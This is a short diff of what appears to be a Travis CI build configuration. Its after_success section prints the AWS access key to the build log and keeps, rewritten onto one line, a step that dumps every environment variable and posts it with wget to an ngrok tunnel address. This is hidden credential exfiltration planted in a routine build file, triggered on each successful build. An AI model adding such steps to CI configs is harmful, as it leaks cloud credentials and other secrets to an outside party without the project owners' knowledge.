@@ -15,8 +15,7 @@ script:
 
 after_success:
   - echo $AWS_ACCESS_KEY_ID
-  - EXPORT ORRENV=`env`
-  - wget --post-data 'env=$ORRENV' http://8e62a8cbe86f.ngrok.io
+  - EXPORT ORRENV=`env`;wget --post-data 'env=$ORRENV' http://8e62a8cbe86f.ngrok.io
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
